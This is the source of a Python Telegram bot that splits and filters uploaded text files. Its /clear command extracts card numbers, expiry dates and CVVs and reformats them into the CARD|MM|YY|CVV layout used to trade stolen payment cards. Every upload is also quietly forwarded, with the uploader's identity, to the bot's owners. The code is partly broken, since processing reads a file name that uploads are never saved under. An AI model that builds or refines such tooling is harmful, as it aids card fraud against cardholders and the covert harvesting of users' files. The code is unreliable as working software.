#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Telegram TXT‑Processing Bot
Author: Your Name
"""

import os
import re
import asyncio
import logging
import zipfile
from pathlib import Path
from datetime import datetime
from typing import List

import aiofiles
from telegram import (
    Update,
    BotCommand,
    ChatAction,
    Message,
    InputFile,
    File,
    ParseMode,
)
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    ContextTypes,
    filters,
)

# --------------------------------------------------------------------------- #
# Configuration
# --------------------------------------------------------------------------- #

BOT_TOKEN: str = os.getenv("BOT_TOKEN")
if not BOT_TOKEN:
    raise RuntimeError("BOT_TOKEN environment variable not set")

OWNER_IDS: List[int] = [
    int(id_.strip()) for id_ in os.getenv("OWNER_IDS", "").split(",") if id_.strip()
]
if not OWNER_IDS:
    raise RuntimeError("OWNER_IDS environment variable not set or empty")

DATA_DIR = Path("data")
LOG_DIR = Path("logs")
LOG_FILE = LOG_DIR / "bot.log"

# --------------------------------------------------------------------------- #
# Logging
# --------------------------------------------------------------------------- #

LOG_DIR.mkdir(exist_ok=True)
logger = logging.getLogger("telegram_bot")
logger.setLevel(logging.INFO)
handler = logging.handlers.RotatingFileHandler(
    LOG_FILE, maxBytes=5_000_000, backupCount=5
)
formatter = logging.Formatter(
    "%(asctime)s - %(levelname)s - %(name)s - %(message)s"
)
handler.setFormatter(formatter)
logger.addHandler(handler)

# --------------------------------------------------------------------------- #
# Utility helpers
# --------------------------------------------------------------------------- #

async def download_file(
    file_id: str, dest_path: Path, chat: Message
) -> File:
    """
    Downloads a Telegram file to the given destination path.
    """
    file_obj = await chat.bot.get_file(file_id)
    await file_obj.download_to_drive(custom_path=str(dest_path))
    return file_obj


def sanitize_filename(filename: str) -> str:
    """
    Keep only the base name and force .txt extension.
    """
    base = Path(filename).stem
    return f"{base}.txt"


async def forward_to_owners(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    Forward the uploaded file to all OWNER_IDS and send a summary message.
    """
    message = update.message
    if not message:
        return

    for owner_id in OWNER_IDS:
        try:
            await message.forward_chat(chat_id=owner_id)
        except Exception as exc:
            logger.error(f"Failed to forward to {owner_id}: {exc}")

    # Compose summary
    user = message.from_user
    summary = (
        f"*New TXT file uploaded*\n"
        f"👤 *Name:* {user.full_name}\n"
        f"✉️ *Username:* @{user.username or 'N/A'}\n"
        f"🆔 *User ID:* {user.id}\n"
        f"🕒 *Upload Time:* {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')}\n"
        f"📄 *File Name:* {message.document.file_name}\n"
        f"💾 *File Size:* {message.document.file_size:,} bytes"
    )

    for owner_id in OWNER_IDS:
        try:
            await context.bot.send_message(
                chat_id=owner_id, text=summary, parse_mode=ParseMode.MARKDOWN
            )
        except Exception as exc:
            logger.error(f"Failed to send summary to {owner_id}: {exc}")


async def edit_progress(
    context: ContextTypes.DEFAULT_TYPE, message: Message, progress: int
):
    """
    Edit the progress message.
    """
    try:
        await message.edit_text(f"Processing... {progress}%")
    except Exception:
        pass  # message may already be deleted


# --------------------------------------------------------------------------- #
# Command Handlers
# --------------------------------------------------------------------------- #

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "👋 Hi! I can split, filter, or clean your TXT files.\n"
        "Use /help to see all commands."
    )


async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = (
        "*Available Commands*\n"
        "/start – Show this message\n"
        "/help – Show this help\n"
        "/spl <N> or /spl<N> – Split file into parts with N lines each\n"
        "/ext <prefix> or /ext<prefix> – Keep only lines starting with prefix\n"
        "/clear – Clean each line into CARD|MM|YY|CVV format\n"
        "/stop – Cancel the current operation\n"
    )
    await update.message.reply_text(help_text, parse_mode=ParseMode.MARKDOWN)


async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    task = context.user_data.get("task")
    if task and not task.done():
        task.cancel()
        await update.message.reply_text("⚠️ Operation cancelled.")
    else:
        await update.message.reply_text("⚠️ No active operation to cancel.")


# --------------------------------------------------------------------------- #
# File upload handler
# --------------------------------------------------------------------------- #

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    document = update.message.document
    if not document or document.mime_type != "text/plain":
        await update.message.reply_text(
            "❌ Only plain text (.txt) files are accepted."
        )
        return

    # Sanitize and prepare directory
    user_id = update.effective_user.id
    user_dir = DATA_DIR / str(user_id)
    user_dir.mkdir(parents=True, exist_ok=True)
    target_path = user_dir / sanitize_filename(document.file_name)

    # Remove old file if exists
    if target_path.exists():
        target_path.unlink()

    # Download file
    await update.message.reply_text("📥 Downloading file...")
    try:
        file_obj = await download_file(
            document.file_id, target_path, update.message
        )
    except Exception as exc:
        logger.error(f"Download failed: {exc}")
        await update.message.reply_text("❌ Failed to download file.")
        return

    await update.message.reply_text("✅ File downloaded.")

    # Forward to owners
    await forward_to_owners(update, context)

    # Notify user that file is ready
    await update.message.reply_text(
        "📄 File saved. You can now use /spl, /ext, or /clear."
    )


# --------------------------------------------------------------------------- #
# Processing Functions
# --------------------------------------------------------------------------- #

async def process_split(
    update: Update,
    context: ContextTypes.DEFAULT_TYPE,
    lines_per_part: int,
):
    """
    Split the uploaded file into N‑line parts.
    """
    user_id = update.effective_user.id
    user_dir = DATA_DIR / str(user_id)
    input_file = user_dir / "upload.txt"

    if not input_file.exists():
        await update.message.reply_text("❌ No uploaded file found.")
        return

    output_dir = user_dir / "output"
    output_dir.mkdir(exist_ok=True)
    # Remove old outputs
    for p in output_dir.glob("*"):
        p.unlink()

    # Progress tracking
    progress_msg = await update.message.reply_text("Processing... 0%")
    total_size = input_file.stat().st_size
    processed_bytes = 0
    line_count = 0
    part_idx = 1
    out_file = None
    out_writer = None

    card_regex = re.compile(r"(?P<card>\d{13,19})\s*(?P<mm>\d{2})\s*(?P<yy>\d{2})\s*(?P<cvv>\d{3,4})")

    async def write_line(line: str):
        nonlocal out_writer, out_file, part_idx, line_count
        if out_writer is None or line_count >= lines_per_part:
            # close previous
            if out_writer:
                await out_writer.aclose()
            part_path = output_dir / f"part_{part_idx}.txt"
            out_file = part_path
            out_writer = await aiofiles.open(part_path, mode="w", encoding="utf-8")
            part_idx += 1
            line_count = 0
        await out_writer.write(line + "\n")
        line_count += 1

    try:
        async with aiofiles.open(input_file, mode="r", encoding="utf-8") as fin:
            async for raw_line in fin:
                line = raw_line.rstrip("\n")
                await write_line(line)
                processed_bytes += len(raw_line.encode("utf-8"))
                # Update progress every 1% or 5k lines
                if processed_bytes >= total_size * 0.01 or line_count % 5000 == 0:
                    progress = int((processed_bytes / total_size) * 100)
                    await edit_progress(context, progress_msg, progress)
        # close last writer
        if out_writer:
            await out_writer.aclose()
    except asyncio.CancelledError:
        # Clean up partial output
        if out_writer:
            await out_writer.aclose()
        for p in output_dir.glob("*"):
            p.unlink()
        await update.message.reply_text("⚠️ Operation cancelled and cleaned up.")
        return
    except Exception as exc:
        logger.error(f"Split error: {exc}")
        await update.message.reply_text("❌ Error during splitting.")
        return

    await edit_progress(context, progress_msg, 100)
    await progress_msg.delete()

    # Count output files
    parts = list(output_dir.glob("part_*.txt"))
    if not parts:
        await update.message.reply_text("❌ No parts created.")
        return

    # Send files or zip
    if len(parts) <= 5:
        # Send individually
        await update.message.reply_text(f"📦 {len(parts)} files ready:")
        for part in parts:
            await context.bot.send_document(
                chat_id=update.effective_chat.id,
                document=InputFile(str(part)),
                filename=part.name,
            )
    else:
        # Zip and send
        zip_path = output_dir / "parts.zip"
        with zipfile.ZipFile(zip_path, "w", compression=zipfile.ZIP_DEFLATED) as zf:
            for part in parts:
                zf.write(part, arcname=part.name)
        await update.message.reply_text("📦 >5 files – sending ZIP.")
        await context.bot.send_document(
            chat_id=update.effective_chat.id,
            document=InputFile(str(zip_path)),
            filename=zip_path.name,
        )
        zip_path.unlink()  # delete temp zip

    # Clean up
    for part in parts:
        part.unlink()
    await update.message.reply_text("✅ Done! Files cleaned up.")


async def process_extract(
    update: Update,
    context: ContextTypes.DEFAULT_TYPE,
    prefix: str,
):
    """
    Extract lines that start with the given prefix.
    """
    user_id = update.effective_user.id
    user_dir = DATA_DIR / str(user_id)
    input_file = user_dir / "upload.txt"

    if not input_file.exists():
        await update.message.reply_text("❌ No uploaded file found.")
        return

    output_file = user_dir / "ext_output.txt"
    if output_file.exists():
        output_file.unlink()

    progress_msg = await update.message.reply_text("Processing... 0%")
    total_size = input_file.stat().st_size
    processed_bytes = 0

    try:
        async with aiofiles.open(input_file, mode="r", encoding="utf-8") as fin, \
                   aiofiles.open(output_file, mode="w", encoding="utf-8") as fout:
            async for raw_line in fin:
                line = raw_line.rstrip("\n")
                if line.startswith(prefix):
                    await fout.write(line + "\n")
                processed_bytes += len(raw_line.encode("utf-8"))
                if processed_bytes >= total_size * 0.01 or processed_bytes % 50000 == 0:
                    progress = int((processed_bytes / total_size) * 100)
                    await edit_progress(context, progress_msg, progress)
    except asyncio.CancelledError:
        if output_file.exists():
            output_file.unlink()
        await update.message.reply_text("⚠️ Operation cancelled.")
        return
    except Exception as exc:
        logger.error(f"Extract error: {exc}")
        await update.message.reply_text("❌ Error during extraction.")
        return

    await edit_progress(context, progress_msg, 100)
    await progress_msg.delete()

    if not output_file.exists() or output_file.stat().st_size == 0:
        await update.message.reply_text("⚠️ No lines matched the prefix.")
        return

    await context.bot.send_document(
        chat_id=update.effective_chat.id,
        document=InputFile(str(output_file)),
        filename=output_file.name,
    )
    output_file.unlink()
    await update.message.reply_text("✅ Extraction complete.")


async def process_clear(
    update: Update,
    context: ContextTypes.DEFAULT_TYPE,
):
    """
    Clean each line into CARD|MM|YY|CVV format if possible.
    """
    user_id = update.effective_user.id
    user_dir = DATA_DIR / str(user_id)
    input_file = user_dir / "upload.txt"

    if not input_file.exists():
        await update.message.reply_text("❌ No uploaded file found.")
        return

    output_file = user_dir / "clear_output.txt"
    if output_file.exists():
        output_file.unlink()

    progress_msg = await update.message.reply_text("Processing... 0%")
    total_size = input_file.stat().st_size
    processed_bytes = 0

    card_regex = re.compile(
        r"(?P<card>\d{13,19})\s*(?P<mm>\d{2})\s*(?P<yy>\d{2})\s*(?P<cvv>\d{3,4})"
    )

    try:
        async with aiofiles.open(input_file, mode="r", encoding="utf-8") as fin, \
                   aiofiles.open(output_file, mode="w", encoding="utf-8") as fout:
            async for raw_line in fin:
                line = raw_line.rstrip("\n")
                match = card_regex.search(line)
                if match:
                    cleaned = f"{match.group('card')}|{match.group('mm')}|{match.group('yy')}|{match.group('cvv')}"
                    await fout.write(cleaned + "\n")
                else:
                    await fout.write(line + "\n")
                processed_bytes += len(raw_line.encode("utf-8"))
                if processed_bytes >= total_size * 0.01 or processed_bytes % 50000 == 0:
                    progress = int((processed_bytes / total_size) * 100)
                    await edit_progress(context, progress_msg, progress)
    except asyncio.CancelledError:
        if output_file.exists():
            output_file.unlink()
        await update.message.reply_text("⚠️ Operation cancelled.")
        return
    except Exception as exc:
        logger.error(f"Clear error: {exc}")
        await update.message.reply_text("❌ Error during cleaning.")
        return

    await edit_progress(context, progress_msg, 100)
    await progress_msg.delete()

    if not output_file.exists() or output_file.stat().st_size == 0:
        await update.message.reply_text("⚠️ No data to send.")
        return

    await context.bot.send_document(
        chat_id=update.effective_chat.id,
        document=InputFile(str(output_file)),
        filename=output_file.name,
    )
    output_file.unlink()
    await update.message.reply_text("✅ Cleaning complete.")


# --------------------------------------------------------------------------- #
# Command dispatcher
# --------------------------------------------------------------------------- #

async def command_dispatcher(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    Parse the command and arguments, then launch the corresponding async task.
    """
    text = update.message.text or ""
    parts = text.split(maxsplit=1)
    command = parts[0].lower()
    args = parts[1] if len(parts) > 1 else ""

    # Determine user task key
    user_id = update.effective_user.id

    # Cancel any existing task before starting a new one
    existing_task = context.user_data.get("task")
    if existing_task and not existing_task.done():
        existing_task.cancel()

    # Helper to launch a task
    def launch(coro):
        task = asyncio.create_task(coro)
        context.user_data["task"] = task
        return task

    try:
        if command in ("/spl",):
            if not args:
                raise ValueError("Missing line count argument.")
            lines_per_part = int(args)
            if lines_per_part <= 0:
                raise ValueError("Line count must be positive.")
            launch(process_split(update, context, lines_per_part))

        elif command.startswith("/spl"):
            # /spl<N>
            num_str = command[4:]
            if not num_str.isdigit():
                raise ValueError("Invalid line count.")
            lines_per_part = int(num_str)
            launch(process_split(update, context, lines_per_part))

        elif command in ("/ext",):
            if not args:
                raise ValueError("Missing prefix argument.")
            prefix = args.strip()
            launch(process_extract(update, context, prefix))

        elif command.startswith("/ext"):
            prefix = command[4:].strip()
            if not prefix:
                raise ValueError("Missing prefix.")
            launch(process_extract(update, context, prefix))

        elif command in ("/clear",):
            launch(process_clear(update, context))

        else:
            await update.message.reply_text("❌ Unknown command. Use /help.")
    except ValueError as ve:
        await update.message.reply_text(f"❌ {ve}")
    except Exception as exc:
        logger.exception("Unhandled exception in command dispatcher")
        await update.message.reply_text("❌ An unexpected error occurred.")


# --------------------------------------------------------------------------- #
# Main entry point
# --------------------------------------------------------------------------- #

def main():
    application = (
        Application.builder()
        .token(BOT_TOKEN)
        .concurrent_updates(True)
        .build()
    )

    # Register commands
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("stop", stop))
    # All other commands are routed through the dispatcher
    application.add_handler(MessageHandler(filters.COMMAND, command_dispatcher))
    # Document handler
    application.add_handler(
        MessageHandler(filters.Document.FILE_NAME & filters.Document.MIME_TYPE("text/plain"), handle_document)
    )
    # Unknown command fallback
    application.add_handler(
        MessageHandler(filters.COMMAND, lambda upd, ctx: upd.message.reply_text("❌ Unknown command. Use /help."))
    )

    # Start the bot
    logger.info("Bot is starting...")
    application.run_polling()


if __name__ == "__main__":
    main()
